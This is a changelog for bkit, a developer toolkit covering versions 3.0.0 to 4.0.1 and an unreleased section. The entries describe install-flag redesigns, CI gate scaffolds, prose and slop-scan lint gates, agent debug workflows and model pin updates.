Split `--tooling` into a stack-agnostic CI foundation and an opt-in Node/TS toolchain (#265), so a non-Node repo can adopt bkit's CI gate graph + prose-lint without inheriting `tsc`/`vitest`/`slop-scan`/`husky`.

### Added

- **`--ci` and `--typescript` install flags.** `--ci` seeds the stack-agnostic CI/quality foundation: the `ci.yml` **skeleton** (gate graph + capstone contract + branch-protection, with the Node/TS build/test/lint step bodies present as **commented examples**) plus the Vale prose-lint config (`.vale.ini` + `.vale/styles/House/`). It adds **no `package.json` footprint** and runs trivially green on any repo. `--typescript` adds the Node/TS toolchain (`tsc --noEmit`, slop-scan + the `boundary/type-suppression` rule, prettier, husky + lint-staged) and **activates the wired `ci.yml` step bodies**; it implies `--ci`.
- **`deriveCiSkeleton`** — derives the agnostic `ci.yml` skeleton from the single wired template by commenting out the `# bkit:start ts-ci-steps` regions, so the wired and skeleton forms never drift.

### Changed

- **`--tooling` is now a back-compat alias for `--ci --typescript`.** Existing `install --tooling` / `uninstall --tooling` behaviour is unchanged (still the symmetric `ci + lint + git-hooks` bundle). `uninstall --typescript` removes only the Node/TS bits (lint + git-hooks), leaving the agnostic `--ci` foundation in place.
- **Module re-bucketing (no module-ID churn).** Vale config moved `lint → ci` (it lints `.md`, stack-agnostic). The `typecheck` script and the slop-scan helper scripts (`.bkit/scripts/bkit-slop-type-suppression.mjs`, `bkit-slop-delta.sh`) moved into the `lint` module so a non-Node `--ci` consumer never receives them — the slop scripts no longer ship via the core template walk.

### Fixed

- **`lint-staged` orphaned on uninstall** — it was injected by the lint module but not manifest-declared, so a default-only `lint-staged` devDependency survived `bkit uninstall`. It is now tracked by the uninstall stripper.

---

## [4.0.1] — 2026-06-13

CI-scaffold and advisory refinements on top of 4.0.0. Headline: a new `bkit-tests-migrate` tier in the CI scaffold reference, plus a hardened template-reference advisory.

### Added

- **`bkit-tests-migrate` — fresh-DB migration replay gate.** A new opt-in tier in the FULL CI SCAFFOLD REFERENCE (`bkit-stub:bkit-tests-migrate`): an **independent sibling** of `bkit-tests` that proves every migration replays from an EMPTY database (and the seed loads) on a fresh ephemeral instance — catching what `migrate deploy` / `db push` cannot (a stale-volume migration a warm `start` never re-applies, or a seed that aborts on an empty store). It **always runs and reports a status** — branch-protection-safe, never a perpetually-pending required check — while the heavy steps self-skip when no migration/seed source changed, so a no-DB-change PR stays a fast green. It folds into the `bkit-tests-check` capstone (a red replay reds the build) and runs in parallel with `bkit-tests`, not in series — they share no state. Stack-independence holds: bkit ships the always-runs scaffold; the consumer supplies the stack's reset+seed (Supabase `supabase db reset`, Prisma `migrate reset`, Drizzle/raw replay). Surfaces as an advisory on `bkit install` / `bkit upgrade`; documented in `docs/testing.md` and `docs/deployments.md`.

### Changed

- **Template-reference advisory is now mandatory.** The pointer to bkit's canonical templates — shown in the `bkit install` / `bkit upgrade` console banner and in `.bkit/advisories.md` — was a soft "read them to see the ideal state before applying any action". It now directs the agent to **read the templates, reconcile them against the repo's existing config, adopt as much as possible without breaking existing functionality, and state which it does not adopt and why**. The same pointer is added as step 4 of the README "Quick install — paste this into your AI" block.

### Fixed

- **Dangling template-reference path** — the advisory pointed at `node_modules/bkit/.bkit/templates/`, but the package is scoped: corrected to `node_modules/@cbartens/bkit/.bkit/templates/`.
- **Stale doc pointer in the seeded `ci.yml` template** — `.agents/cloud.md` (removed in 3.0.0) corrected to `.bkit/cloud.md`, so consumers no longer inherit a broken reference.
- **slop-scan exemption for the shipped `gateguard.js`** — its opportunistic GC catch tripped `defensive.empty-catch`, so a fresh `bkit install --opencode` PR could fail the enforcing `slop:delta` gate on bkit's own file; the seeded `slop-scan.config.json` now carries the per-file exemption (slop-scan has no inline suppression marker).
- **Advisory tagged-test scan false-positives** and a `slop:delta` gate-doc correction.
- **`.bkit/.env.example` template** — removed an unnecessary blank line.

---

## [4.0.0] — 2026-06-11

CLI surface redesign ([#252](https://github.com/cbartens/bkit/issues/252)) — a **breaking change** to `bkit install`. The implicit `install → --full` default is gone: the host/module axis is now explicit and required, the granular tooling flags collapse to one `--tooling` bundle, and the deprecated flag aliases are removed. Internal module identities (`ci`/`lint`/`git-hooks`/`renovate`/`dependabot`/`cloud`) and the install dispatch engine are unchanged — the change lives in the parse + ownership layers. The shipped CI gate (`bkit check`, run bare) is unaffected.

### Added

- **Managed-version marker on every rendered prompt/workflow ([#256](https://github.com/cbartens/bkit/issues/256)).** `bkit install` / `bkit upgrade` now stamp an inert `<!-- bkit:managed vX.Y.Z — do NOT edit; run \`bkit upgrade\` to refresh -->`comment into every rendered agent + command across`.claude/`, `.cursor/`, and `.opencode/`(after the frontmatter, one blank line below; at file top for cursor/opencode commands whose frontmatter is stripped). The marker is injected at render time — the`.bkit/prompts/_`and`.bkit/workflows/_`sources stay version-agnostic, so there are no per-release template edits.`bkit check`now **hard-fails** (new`bkit-rendered-prompts-stale`blocker) when any rendered marker drifts from the installed bkit version, so a consumer who bumps`@cbartens/bkit`without re-rendering — or hand-edits a managed mirror — can never silently run outdated prompts/workflows. Recovery:`pnpm bkit upgrade`(or re-run`bkit install`) re-stamps everything.

### Changed (breaking)

- **`bkit install` now requires at least one module flag — a bare `bkit install` errors.** Name what to install: `--claude`, `--cursor`, `--opencode=<provider>`, `--tooling` (plus the opt-ins `--dependency=<renovate|dependabot>`, `--auto=<claude|cursor>`). Hosts compose: `bkit install --claude --cursor --opencode=nvidia`. Core (the stack-agnostic foundation: `AGENTS.md`, `.agents/`, `.gitignore`/`.gitattributes`, `docs/`, `.bkit/*.md`, `.bkit/version`) is **implicit** on every install — there is no `--core` flag.
- **`--ci` / `--lint` / `--git-hooks` collapse to a single `--tooling` flag** (the interdependent bundle: husky hooks run vale/slop; CI runs lint+check). Symmetric across install ↔ uninstall; `--keep-tooling` is unchanged.
- **`bkit check` and `bkit upgrade` take no module flags** — both operate on everything already installed. `check` now scopes drift detection to the installed host/tooling set (a `--cursor`-only repo no longer reports `.claude/**` as drift). A stray module flag is a hard error pointing to the no-flag form. `bkit upgrade` gains `--auto-apply` (renamed from `--non-interactive`).
- **`CLAUDE.md` ownership moved from core → the `claude` module.** It is a Claude-Code-only root redirect to `.agents/rules.md` — the exact analog of Cursor's `.cursor/rules/00-shared-rules.mdc` (which ships with `--cursor`). `bkit install --claude` ships it; a `--cursor`-only install ships none; `bkit uninstall --claude` removes it. `AGENTS.md` (the cross-host dispatch router) stays core.
- **Tracker switching is now free.** Install `--force` (the tracker-switch override) is dropped; a `--tracker=` value always applies, first-set or re-set. `--force` remains an uninstall flag (force-delete consumer-modified Tier-3 files).

### Removed

- **Dropped flags (now rejected as `Unknown flag`):** `--full`, `--core`, `--ci`, `--lint`, `--git-hooks`, the bare `--renovate` / `--dependabot` aliases (use `--dependency=<name>`), `--cloud` / `--cloud=<variant>` (use `--auto` / `--auto=<variant>`), and install `--force`. `--non-interactive` is renamed to `--auto-apply`.

### Notes

- **Legacy `CLAUDE.md` orphan:** a pre-4.0 `--cursor`-only consumer that carries a core-written `CLAUDE.md` keeps it as a harmless orphan after upgrade — core no longer manages it and (no claude) nothing re-manages it. It is a 2-line redirect; delete it manually if unwanted.
- Hand-written consumer scripts that called `bkit install --full` / `--ci` / `--renovate` / `--cloud=…` now error — update them to the new spellings above. Shipped consumer CI is safe (it runs bare `bkit check`).

---

## [3.4.2] — 2026-06-08

Adds a template-reference pointer to every advisory surface so agents acting on findings can immediately locate the canonical bkit-managed files without spelunking `node_modules`.

### Changed

- **Generated `.bkit/advisories.md` and the inline console checklist (`formatChecklist`) now include a template-reference line after the AI-agent instructions block.** After the #160 layout refactor, `node_modules/bkit/.bkit/templates/` became the only location for canonical bkit-managed files (husky hooks, CI workflow, `.claude/settings.json`, `.cursor/` config, renovate, vale, etc.) — but nothing told agents where to look before applying an advisory action. The pointer fires on any non-empty advisory run (install, upgrade, check, doctor) and is absent on clean runs.

---

## [3.4.1] — 2026-06-08

A patch release refining the cloud debug-fetch operator-cred guidance shipped in 3.4.0. The seeded `.bkit/.env.example` no longer carries an orphaned `GOOGLE_APPLICATION_CREDENTIALS` or the non-secret selectors, and the `observability.md` example blocks now show how to make those selectors portable to headless cloud agents. Lands on `pnpm bkit install` / `upgrade`.

### Changed

- **Non-secret debug-fetch selectors move out of `.bkit/.env.example` into the `observability.md` blocks that use them (refines [#227](https://github.com/cbartens/bkit/issues/227)).** `VERCEL_SCOPE` and `SUPABASE_PROJECT_ID` were seeded as `.bkit/.env` stubs, but a headless cloud agent never reads that file — and `.envrc` force-`unset`s `SUPABASE_PROJECT_ID` on a Supabase-CLI repo (the CLI mis-reads it as a `config.toml` override) — so the only portable home for a non-secret selector is the copied debug-fetch block itself. Each shipped `vercel` / `supabase` block now carries a commented `VERCEL_SCOPE=` / `SUPABASE_PROJECT_ID=` assignment line to uncomment; the `vercel` block documents that `--environment` defaults to `preview` (set `VERCEL_ENV=production` for production logs) and the `supabase` block notes preview and production are separate project refs. Both the `observability-debug-fetch-missing` and `observability-debug-fetch-source-not-enabled` advisories now state the in-block selector requirement, and the two surviving secret tokens (`VERCEL_TOKEN`, `SUPABASE_ACCESS_TOKEN`) carry a note that they need not be duplicated in `.bkit/.env` when `apps/*/.env` already exposes them via direnv.

### Removed

- **`GOOGLE_APPLICATION_CREDENTIALS` removed from the shipped `.bkit/.env.example` and the observability advisories.** 3.4.0 seeded it for a non-interactive `gcloud` debug-fetch path, but no `gcloud` example block ships, no consumer uses it (the dogfood repos authenticate to GCP via inline `GCP_CLIENT_EMAIL` / `GCP_PRIVATE_KEY`, not a `GOOGLE_APPLICATION_CREDENTIALS` file path), and it sat orphaned among the `gcloud` / `aws` / `datadog` "author your own" backends that get no seeded stub. The generic "author your own" guidance still names `gcloud`.

---

## [3.4.0] — 2026-06-07

Removes the OBSERVE debug mode introduced in 3.3.0 — observation logging now lives only inside SOAK — hardens the shipped `slop:delta` gate against build output, and fixes the verbose-CI Playwright-trace guidance so a `-- --trace=on` passthrough can no longer break a `test:e2e` script. Workflow, gate-config, and advisory changes land on `pnpm bkit install` / `upgrade`.

### Added

- **Install advisory flags debug-fetch sources that are used but not enabled in `observability.md` (builds on issue [#227](https://github.com/cbartens/bkit/issues/227)).** A new `observability-debug-fetch-source-not-enabled` advisory fires when a named debug-fetch example block ships for a backend the repo demonstrably runs (e.g. a `supabase` block alongside `@supabase/*`) but no matching block is enabled below `<!-- bkit:end -->` — the post-upgrade partial-enablement footgun the existing `-missing` advisory cannot see (a start+end pair already exists). Evidence-gated to avoid nagging single-backend repos; a `<!-- debug-fetch:none intentional -->` marker dismisses both debug-fetch advisories.

### Changed

- **`/debug` drops OBSERVE mode — observation logging now lives only inside SOAK (issue [#143](https://github.com/cbartens/bkit/issues/143)).** The 3.3.0 `NORMAL -> OBSERVE -> SOAK` ladder collapses to `NORMAL -> SOAK`. OBSERVE was gated on a weak `DEBUG_ATTEMPT == 2` proxy, instrumented before diagnosis, and its `[DEBUG-OBSERVE]` capture was blind to out-of-process / live-stack failures — the runtime-only bug class #143 targets — so it was a strict subset of SOAK via a worse mechanism. The two observe subagents (`bkit-debug-observe-instrument` / `-revert`) are pruned and the debug workflow renumbers to 10 steps. SOAK is now entered three ways — invocation start (`DEBUG_ATTEMPT >= MAX_DEBUG_ATTEMPT` or `[soak]`), the mid-run diagnose `Mode: SOAK` signal, or NORMAL-loop exhaustion — and gets its own `SOAK_ATTEMPT` / `MAX_SOAK_ATTEMPT` budget, reset on every SOAK entry; the NORMAL loop's counter is renamed `NORMAL_ATTEMPT` / `MAX_NORMAL_ATTEMPT` (`/build` and `/ship` keep `TEST_ATTEMPT`). A Close-Workflow no-leak assertion fails the run if any added `[DEBUG-OBSERVE]` line survives the debug diff. Canonical docs (`testing.md`, `architecture.md`) are synced to the new model; DE-25 records the decision. `.claude` / `.cursor` mirrors regenerated.
- **Verbose-CI Playwright trace guidance: `test:e2e` reads `VERBOSE_CI` internally instead of a turbo / pnpm passthrough.** The shipped `ci.yml` E2E stub and the `playwright-reporter-line-override-hostile` advisory previously recommended a `-- --trace=on` passthrough (`pnpm test:e2e ${VERBOSE_CI:+-- --trace=on}`). turbo and pnpm append passthrough args to the script string, so under `[verbose ci]` this silently breaks any `test:e2e` whose script ends in a bash construct (`fi` / `done` / `esac`). Both now recommend a `test:e2e` that reads `VERBOSE_CI` and appends `--trace=on` to its own `playwright test` call, invoked plainly as `pnpm test:e2e`. bkit's canonical conditional form was already safe in the common non-verbose case; this closes the verbose-mode edge.

### Fixed

- **`slop:delta` ignores build output (`**/dist/**`, `**/.next/**`, `**/.turbo/**`, `**/coverage/**`, `**/node_modules/**`) by default (refines issue [#226](https://github.com/cbartens/bkit/issues/226)).** The enforcing slop gate compares a clean base worktree against the live `--head .` tree, so any gitignored build artifact present live but absent from the base read as net-new slop and failed the gate spuriously — one consumer hit 707 phantom findings from `apps/web/.next/`. slop-scan honours only the ROOT `.gitignore`, and the old ignores were root-relative, so nested build dirs (`apps/web/dist/`) leaked through. The default `slop-scan.config.json` now ships depth-agnostic `**/X/**` globs (verified they still ignore bkit's own tracked root `dist/`), and the upgrade advisory directs existing consumers to merge the new globs into their own config. Recorded as KN-32.
- **Dropped `pinnedCommit` provenance stamping — the pre-push gate it fed was unsatisfiable (issue [#230](https://github.com/cbartens/bkit/issues/230)).** `pinnedCommit` chased live HEAD and fed `commitChanged` into the version-pin write decision, so `bkit check` (the pre-push drift gate) flagged drift on every commit — the stored pin can never equal the commit being created (you stamp the pin before committing), which blocked all pushes to the bkit repo. It is removed (redundant with `pinnedVersion` for npm consumers); GateGuard, config-protection, and the catalog-parity test are kept.
- **Board-sync `statusFieldId` resolution and cloud debug-fetch logging (from dogfooding 3.3.1).** `buildGithubProjectAdvisory` now resolves the numeric Status field id via `gh api …/fields` instead of `gh project field-list` (which returns the GraphQL node id), and a new advisory flags a configured board whose `statusFieldId` holds a node id (`projects_write` needs the numeric id). Debug-fetch self-gates now emit a `[debug-fetch:<name>] skipped — …` breadcrumb instead of exiting silently, and `/bkit-debug` records the skip reason as the runtime artifact when stdout is empty. Non-interactive cloud auth for the operator read-creds is documented in `observability.md`.

---

## [3.3.1] — 2026-06-06

A patch release: the `slop:delta` enforcing gate now stages its JSON to a temp file instead of reading a pipe, and the husky hook-setup advisories record eslint as the one sanctioned monorepo deviation from bkit's lint-hook layout. Both land on `pnpm bkit install` / `upgrade`.

### Changed

- **`slop:delta` stages `slop-scan delta --json` to a temp file instead of `readFileSync(0)` on a pipe (refines [#226](https://github.com/cbartens/bkit/issues/226)).** The enforcing slop gate piped `delta --json` into an inline `node readFileSync(0)` reader — a fragile idiom that leans on `pipefail` to surface slop-scan's own non-zero exit and carries partial-read / SIGPIPE risk if node exits before draining the stream. It now redirects the JSON to a `mktemp` file (folded into the existing cleanup trap) that node reads via `process.argv[1]`, so `set -e` catches a non-zero slop-scan exit directly. Defensive hardening at zero behavioural cost — the net-delta gate logic (`netFindingCount` / `netRepoScore`, so position-keyed line-shifts don't false-positive) is unchanged. Ships via the template `scripts/tooling/slop-delta.sh`.
- **Husky hook-setup advisories record eslint as the one sanctioned monorepo deviation from bkit's lint-hook layout.** The `.husky/pre-commit` and `.husky/pre-push` merge-instructions (printed when a consumer already owns those hooks) now note that eslint legitimately belongs at pre-push, run per-package via turbo so each package's own flat config resolves — never in lint-staged, which passes repo-root-absolute paths that bypass per-package config. Format, prose, slop, and drift gates still follow bkit's placement.

---

## [3.3.0] — 2026-06-05

Ships two real CI gates to consumers that previously enforced nothing — `slop:delta` (net-new LLM-slop) and Vale prose — redesigns `/debug` around reproduce-first, run-the-real-thing empirical debugging with a NORMAL → OBSERVE → SOAK mode ladder, and makes every phase orchestrator return its `{phase}-summary.md` verbatim with a tracker issue link. All three land on `pnpm bkit install` / `upgrade`.

### Added

- **Real `slop:delta` + Vale prose gates now ship to consumer pre-push and CI (issue [#226](https://github.com/cbartens/bkit/issues/226)).** `lint:slop` was report-only and Vale was never installed in CI, so both "gates" silently enforced nothing. A new `scripts/tooling/slop-delta.sh` runs a worktree-based `slop-scan delta` and fails only on findings a change **adds or worsens** versus the base — gating on net `findingCount` / `repoScore` so slop-scan 0.3.0's position-keyed deltas don't false-positive on innocent line-shifts (a pure shift nets to zero and passes; a genuinely new or worsened finding raises the net count/score and fails). It ships via the core-templates pass (`+x` preserved) and the `slop:delta` script is seeded through `runLintModule` + lint managed keys. The template **pre-push** gains `lint:prose` + `slop:delta` (a full deterministic CI mirror) and the template **pre-commit** drops the dead `lint:slop` scan; the template **`ci.yml`** gains `Install Vale` + `vale sync` (consumer prose was a dead gate — Vale was never installed), a `Run Slop Delta` step on PRs, and `fetch-depth: 0` for the base worktree. `slop-scan` stays a managed consumer devDep and Vale guard-skips when absent. Upgrade advisories (first-install note, the lint-script advisories, the `ci.yml` setup help, and the `deployments.md` pre-push gate table + revert-bypass list) are synced to enumerate the full gate set and the two CI steps existing consumers must add on upgrade.

### Changed

- **`/debug` redesigned around reproduce-first, empirical debugging (issue [#143](https://github.com/cbartens/bkit/issues/143)).** A 12-step debug loop now runs a mode ladder — NORMAL → OBSERVE (2nd pass) → SOAK (3rd+) — with a session-prompt `[soak]` override and a mid-run NORMAL→SOAK fast-track driven by the diagnose `Mode` field. A new `bkit-debug-soak` agent runs one accumulating-context instrument-or-fix step per iteration against the failing boundary (replacing the observe-analyse split). Live-test plumbing (`TESTS_LIVE` / `TEST_SCOPE` verbatim command / `TESTS_LIVE_SKIPPED`) is threaded across build + debug with `scope` recorded in `status.jsonl`, and summaries fold the dedicated Live Tests section into a single "Live tests ran and passed?" question. Gate items are canonicalised to "Verdict extracted and valid (`VAR` in `ENUM`)" across build/plan/ship/debug, `bkit-ship-deferred-sweep` is aligned to the standing-directive corpus, and labelled decision blocks (`Route:` / `Decide:`) are documented (DE-24). `.claude` / `.cursor` mirrors regenerated.
- **Phase orchestrators return the `{phase}-summary.md` content verbatim as their final message, plus a tracker issue link (issue [#224](https://github.com/cbartens/bkit/issues/224)).** `/build`, `/debug`, `/design`, `/plan`, and `/ship` now display the summary markdown verbatim (identical to the tracker summary comment, including its Recommended Next Step) instead of extracting a separate next-step line, then append a `[{ISSUE_ID} {TITLE}]({URL})` link. The title and URL are captured at the Step-1 issue read; the link sits in a tracker-wired block so it renders for GitHub/Linear and is dropped under no-tracker. Mirrors regenerated.

---

## [3.2.1] — 2026-06-03

Tightens issue-label handling across the phase workflows: workflow-created issues are no longer auto-enrolled into `bkit:auto`, and each workflow now stamps the correct phase label when it has to mint an issue. Workflow-source only — lands on `pnpm bkit install` / `upgrade`.

### Changed

- **`bkit:auto` is now manual-enrollment only — no workflow stamps it on a created issue.** Previously the `/design`, `/plan`, `/build`, `/debug`, and `/ship` "no issue ID in prompt → create one" paths (GitHub + Linear) and `/design`'s workstream sub-issue creation all stamped `bkit:auto`, silently enrolling workflow-minted issues into cloud automation. That label is the bkit-cloud trigger gate / live kill switch, so enrollment is now always a deliberate human action. Phase-transition steps still _preserve_ `bkit:auto` when a human added it, and the kill-switch / `bkit [auto route]` marker reads are unchanged.

### Fixed

- **All five phase workflows stamped `bkit:design` when creating an issue, regardless of phase.** The create-issue snippet was copied from `/design` into the other four without adjusting the label, so a freshly created issue was mislabeled — briefly for `/plan`, `/build`, `/ship` (the next step drops the stray label, but a failure in between strands the issue at `bkit:design`), and **permanently** for `/debug`, whose phase-transition is additive and never dropped it (leaving `bkit:design` + `bkit:debug`). Each workflow now stamps its own phase — `/plan`→`bkit:plan`, `/build`→`bkit:build`, `/debug`→`bkit:debug`, `/ship`→`bkit:ship`. `/design`'s workstream sub-issues now stamp `bkit:design` (was `bkit:auto`), and their create-then-attach is written as the standard `→` flow.

---

## [3.2.0] — 2026-06-03

Adds a bounded, advisory related-issues search to the `/design`, `/plan`, and `/debug` phases so a new feature starts already aware of prior tracker issues, and fixes a `.bkit/`-migration regression that left `.envrc` pointing at the now-empty `.agents/.env`. Both land on `pnpm bkit install` / `upgrade`.

### Added

- **Bounded related-issues search across `/design`, `/plan`, and `/debug` (issue [#135](https://github.com/cbartens/bkit/issues/135)).** A numbered, tracker-gated search step now runs early in design, plan, and debug: it searches the active tracker's issues (GitHub or Linear) by keywords drawn from the phase input (`*-input.md` for design/plan, the error signature for debug), across all states and recency-sorted, fetches each hit's comments, and writes the top 10 as `## #N — title (state)` + body + comments into `related-issues.md` (design/plan) or `debug-context-related-*.md` (debug). The synthesisers read it `(if present)` and pin a condensed reference list for dedup and scope-awareness. Always advisory — capped at 10, never gates, never auto-expands scope; under `none` (no tracker wired) the step collapses to the standard skip stub, so there is no search and no file. Also hardens the git-safety deny list (force-push, `reset --hard`, `checkout`/`restore`/`stash drop`, `rebase -i`) and adds an explicit "NEVER push" to the build/ship worktree setup.

### Fixed

- **`.envrc` left pointing at the now-empty `.agents/.env` after the `.bkit/` migration, silently breaking direnv auto-load.** The 3.0.0 `.bkit/` layout move relocates `.agents/.env` → `.bkit/.env` via `runPayload`, but `.envrc` is Tier-3 seed-or-print so bkit never rewrote the directive it had seeded — consumers upgraded from the `.agents/` layout were left with `.envrc` sourcing a file that no longer exists (the merge advisory is print-only). `runPayload` now re-points only bkit's own whole-line `dotenv_if_exists .agents/.env` directive to `.bkit/.env`, paired with the step-3 file move. The anchored match leaves consumer-appended siblings (e.g. `.agents/.env.local`) and comment lines untouched; idempotent, dogfood-guarded, and dry-run aware. Adds 5 integration cases.

---

## [3.1.0] — 2026-06-02

Model refresh for the subagent fleet: every Opus-pinned agent and the Opus orchestrators move to Opus 4.8, and the Cursor model IDs are corrected to the format Cursor's live API actually serves. Model pins only — no behaviour or scaffold change; lands on `pnpm bkit install` / `upgrade`.

### Changed

- **Subagent + orchestrator model pins bumped to Opus 4.8; Cursor IDs format-corrected; cross-family GPT slots bumped to 5.5 (issue [#205](https://github.com/cbartens/bkit/issues/205)).** All 25 Opus-pinned agents move `claude-opus-4-7` → `claude-opus-4-8` on the Claude side (Sonnet 4.6 / Haiku 4.5 are already the latest in their families — untouched). On the Cursor side the pins are corrected from `claude-4.7-opus-high-thinking` to **`claude-opus-4-8-thinking-high`** — the prior word-order was never present in Cursor's `/v0/models` catalog (only the legacy 4.6 model used it), the likely root of the long-standing "may not be subagent-valid" caveat in `IDEs.md`; the corrected ID was verified against the live `/v0/models` API on 2026-06-02. The cross-family Cursor slots move `gpt-5.4-high` → `gpt-5.5-high`, and the `/design` / `/plan` / `/debug` orchestrator pins move to Opus 4.8. `IDEs.md`'s Cursor model catalog was rewritten to match the live API, and the dashboard label-routing UUID table was flagged as lagging (re-pull before relying on label routing). `.claude/agents` + `.cursor/agents` mirrors regenerated.

---

## [3.0.1] — 2026-06-02

Patch release. bkit's canonical reference docs now land in a consumer's `.bkit/` on install, and the schema-invariant DB-check guidance is reframed around deploy topology. No breaking changes; both land on `pnpm bkit install` / `upgrade`.

### Added

- **Canonical `.bkit/` reference docs are mirrored into the consumer on install (issue [#218](https://github.com/cbartens/bkit/issues/218)).** `cloud.md`, `IDEs.md`, `prompts.md`, `trackers.md`, `workflows.md`, and `README.md` were package-only (read from `node_modules` at runtime) and absent from a consumer's `.bkit/`, so they couldn't be read in-repo. They are now force-overwritten into the consumer's `.bkit/` on every install — sourced directly from the package's own `.bkit/*.md` (single source of truth, no committed duplication, always version-matched). `package.json` `files[]` no longer excludes `.bkit/README.md` so it ships; the six docs are registered in `CORE_MANIFEST` (`byte-equal-text`) so drift detection and uninstall handle them. Dogfood stays a no-op.

### Changed

- **Schema-invariant DB checks reframed — pick the route by deploy topology, not by local pgTAP availability (consumer feedback from gether; refines [#203](https://github.com/cbartens/bkit/issues/203)).** pgTAP and the `@live` catalog-RPC are now presented as two co-equal routes rather than "canonical" vs "remote-only fallback". pgTAP runs against a CI-local fixture built from `supabase/migrations` (fast, hermetic, offline — but can stay green while prod drifts); the `@live` catalog-RPC validates the **real deployed schema** in `bkit-tests-live` and is the recommended default once a consumer has a deploy + `@live` tier (RLS/tenancy invariants especially). Reworded across the three surfaces — the template `ci.yml` stubs (incl. the JOB 3 `@live` block), the `test-db` install/check advisory, and `docs/testing.md` (+ template). Framing/docs only; no scaffold behaviour change.

---

## [3.0.0] — 2026-06-02

Major consolidation release. Three structural shifts land together: bkit's own machinery moves out of `.agents/` into a dedicated `.bkit/` directory, the cloud feature is rebuilt on the Claude GitHub App, and CI adopts the "green == validated" scaffold. Two changes need consumer action on upgrade — the branch-protection required status check and its setup script were renamed (see **Changed**). Everything else, including the `.agents/` → `.bkit/` relocation, migrates automatically on `pnpm bkit upgrade`.

### Added

- **bkit-cloud rebuilt on the Claude GitHub App (issue [#141](https://github.com/cbartens/bkit/issues/141); folds [#184](https://github.com/cbartens/bkit/issues/184)).** The cloud dispatcher (`.github/workflows/bkit-cloud.yml`) now runs on the official Claude GitHub App rather than the prior bespoke runner wiring. A single phase-routed entrypoint classifies the requested bkit phase and dispatches to the matching skill (design/plan/build/debug/ship); invocation, phase classification, and the failure path were streamlined, and the `.claude`/`.cursor` command mirrors realigned to the workflow doc. Consumers adopting cloud need repo Actions-write + PR-creation permissions — a new advisory now flags this (see below).

- **CI scaffold backport — `bkit-decide` → `bkit-tests` → `bkit-tests-live` → `bkit-tests-check`, the "green == validated" model (issue [#203](https://github.com/cbartens/bkit/issues/203); reference impl: gether app-gether-life).** "CI green" must mean "the planned tests actually ran and passed", not "nothing visibly failed" — a partial / cached / light run is green by construction but is not validation. bkit's own `.github/workflows/ci.yml` now runs the degenerate scaffold (`bkit-decide` reads markers + computes `run_level` + escalates direct-`dev` pushes to `full` via `commits/{sha}/pulls`; `bkit-tests` gated on `run_level != none`; `bkit-tests-check` capstone asserts the plan was honoured — no `bkit-tests-live`, bkit has no deploy). The consumer template `.bkit/templates/.github/workflows/ci.yml` gains a **FULL CI SCAFFOLD REFERENCE**: every step of the proven 4-job pipeline, in execution order, commented and annotated (`[UNIVERSAL]`/`[MONOREPO]`/`[DEPLOY]`/`[E2E]`/`[DB]`) with why + when to adopt it. New `bkit install` / `upgrade` advisories fire for the `bkit-decide`, `affected-graph`, `bkit-tests-live`, and `bkit-tests-check` stubs. Template git hooks (`.husky/pre-commit` + `pre-push`) gain local↔CI parity notes (fast deterministic gates local; integration/E2E/@live in CI). `docs/deployments.md` (+ template) Run-level decision matrix updated for the scaffold + capstone.

- **Per-feature run state is now an append-only NDJSON event log (`status.jsonl`, under `docs/plans/`), folded on read (issue [#209](https://github.com/cbartens/bkit/issues/209)).** The old per-FID `status.json` was a mutated JSON array dual-written on both `dev` and the feature branch, which produced unmergeable PR diffs and suppressed CI. It is replaced by an append-only event log folded by a canonical reducer (`bkit-status.ts`, with a legacy-tolerant `parseStatus`), and the log is marked `merge=union` (path-scoped, not all `.jsonl` files) in `.gitattributes` and the template. Run state is now branch-local: build/debug/ship write on `feat/{FID}` with no mid-lifecycle `dev` push, and design/plan likewise feat-locate both their docs and their status (§3) — fixing the design-summary dev-vs-feat path bug. In-flight legacy `status.json` is migrated once on read. All five workflows pin their worktree-`cd` subagent context to `{WORKTREE_PATH}` instead of the fragile `dirname(git-common-dir)` idiom.

- **Phase summaries gain `Outstanding Questions` and a `Recommended Next Step` handoff (issue [#168](https://github.com/cbartens/bkit/issues/168)).** The design summary surfaces an advisory, verdict-neutral `## Outstanding Questions` section sourced from the design artifact's Risks & Open Questions, and all five phase summaries gain a `## Recommended Next Step` block. Each phase workflow posts the next-step block as a dedicated tracker comment (MCP-only, GitHub + Linear, graceful no-tracker degradation) and returns it verbatim. Always advisory — no phase auto-invokes the next.

- **Renovate collapses every auto-mergeable non-major bump into a single weekly group (refs [#215](https://github.com/cbartens/bkit/issues/215)).** Because every Renovate PR rewrites `pnpm-lock.yaml`, multiple grouped PRs firing in one window forced serial rebases and stalled `platformAutomerge`. Non-major devDeps, prod patches, `@types`, and eslint now fold into one `bkit: renovate non-major dependencies` auto-merge group — one weekly lockfile mutation, one merge, no rebase cascade. tanstack/vitest/playwright are re-scoped to major-only lockstep so their non-major bumps join the unified group, `automerge` is made explicit (`false`) on the prod-minor and github-actions rules, and every bkit-managed `groupName` is prefixed `bkit: renovate ` so it is identifiable in a consumer's PR list. Mirrored in `.github/renovate.json5` and the consumer template.

- **New install/check advisories for three silently-degrading GitHub setup gaps.** `github-project-board-sync-unconfigured` fires when the github tracker is active but `bkit.githubProject`, the `projects` MCP toolset, or an org-scoped PAT is missing (opt out via `bkit.githubProject: false`); `gh-token-unset-shell` / `gh-token-empty-shell` check the `GH_TOKEN` shell env that powers the tracker/PR/Projects MCP surface (gated on a configured github MCP server, suppressed in CI); `actions-write-permissions-missing` flags repos whose `bkit-cloud.yml` lacks the Actions-write + PR-creation permissions cloud needs.

- **pgTAP test-database stub and an `@live` RPC fallback for schema-invariant DB checks (part of [#203](https://github.com/cbartens/bkit/issues/203)).** The CI scaffold's template now ships a pgTAP-based test-DB stub, with an `@live` RPC fallback path for DB checks that must run against a live schema rather than a fixture.

### Changed

